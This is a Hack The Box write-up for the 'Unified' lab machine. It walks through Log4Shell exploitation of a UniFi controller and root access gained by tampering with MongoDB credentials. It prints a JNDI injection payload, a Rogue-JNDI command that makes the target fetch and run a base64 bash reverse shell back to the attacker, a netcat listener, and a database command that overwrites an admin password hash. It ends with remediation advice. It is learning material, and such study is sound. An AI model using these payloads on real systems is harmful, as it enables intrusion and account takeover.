# Unified--Hack-The-Box--Cybersecurity-Learning-Journey
I just solved Unified on Hack The Box!


An in-depth security assessment and writeup for the **Unified** machine on HackTheBox. This machine demonstrates the practical exploitation of the infamous **Log4j** vulnerability (CVE-2021-44228) inside a UniFi Network Controller environment, followed by a privilege escalation vector involving MongoDB database manipulation to achieve root-level SSH access.

---

## 🛠️ Skills Learned
* Advanced network packet sniffing and troubleshooting using `tcpdump`.
* Identification and manual exploitation of the **Log4j** (CVE-2021-44228) vulnerability.
* Working with JNDI/LDAP malicious reference servers (`Rogue-JNDI`).
* Upgrading standard reverse shells to fully interactive TTY terminals.
* NoSQL Database enumeration and credential tampering inside **MongoDB**.
* Post-exploitation configuration auditing for hardcoded sensitive data.

---

## 💻 Exploitation Overview

### 1. Reconnaissance & Initial Access
* **Target Environment:** A web server running an unpatched version of the UniFi Network Controller on port `8443`.
* **Vulnerability Identified:** The application logs input from the API authentication endpoints using a vulnerable version of the Log4j library.
* **Exploitation Vector:** Injecting a JNDI lookup string into the `remember` field of the `/api/login` POST payload:
  ```json
  {
    "password": "test",
    "remember": "${jndi:ldap://<10.129.53.149>:1389/o=tomcat}",
    "strict": true,
    "username": "test"
  }
  ```

---
Payload Delivery & Initial Shell
Network Verification: Monitored the tun0 interface using tcpdump to catch incoming SYN packets from the target application confirming outbound LDAP lookups:


Bash
```
sudo tcpdump -i tun0 port 1389
```
Payload Execution: Hosted a malicious JNDI reference server using Rogue-JNDI instructing the target JVM to download and execute a Base64-encoded bash reverse shell payload:


Bash
```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|{bash,-i}" --hostname "<YOUR_TUN0_IP>"
```
Shell Catching: Intercepted the incoming connection on a pre-configured Netcat listener, establishing an initial low-privileged session as the unifi user.


Bash
```
nc -lvnp 4444
```
3. Privilege Escalation to Root
Database Enumeration: Discovered an instance of MongoDB running locally on port 27117. Leveraged the Mongo shell to enumerate application-defined administrators inside the ace database using the db.admin.find() function.


Bash
```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```
Database Tampering: Generated a local custom SHA-512 password hash via mkpasswd and updated the administrator's account document in the DB using the db.admin.update() function to bypass authentication:


Bash
```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("<TARGET_ID>")},{$set:{"x_shadow":"<NEW_SHA512_HASH>"}})'
```
Credential Extraction: Logged into the UniFi Network web interface as the compromised administrator account. Navigated to Settings > Site > SSH Authentication to find the cleartext password for the root user system account.


Final Access: Logged in directly via SSH using the extracted credentials to read the final flag file in the /root/ directory.


Bash
```
ssh root@<TARGET_IP>
🏆 Flags Captured
👤 User Flag: 6ced1a6a89e666c0620cdb10262*****

💀 Root Flag: e50bc93c75b634e4b272d2f771c*****
```
---
🔒 Remediation & Defense
Patch Log4j: Upgrade the underlying logging library to Log4j 2.17.1 or higher where JNDI lookups are disabled by default.

Environment Configuration: Set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true to globally restrict message lookups.

Database Hardening: Enforce strict access control, authentication, and internal firewalls on the local MongoDB service to prevent unauthenticated read/write modifications.
---
---
Secure Storage: Avoid storing infrastructure passwords (like device root credentials) in cleartext configuration fields within the application manager interface.
---
---
LinkedIn: [www.linkedin.com/feed/update/urn:li:activity:7470792738435731456/]

X: [https://x.com/charisma1385/status/2065017669925957700]

---

#HackTheBox #CyberSecurity #PenetrationTesting #Log4j #Log4Shell #MongoDB #Infosec #Writeup #CTF #Linux #UniFi #Log4Shell #CVE-2021-44228 #RCE #Linux #PrivilegeEscalation #OWASP #CyberSecurity #TryHackMe #Pentesting #WebSecurity #SQLInjection #PrivilegeEscalation #EthicalHacking #InfoSec #SecurityResearch #CybersecurityLearningJourney
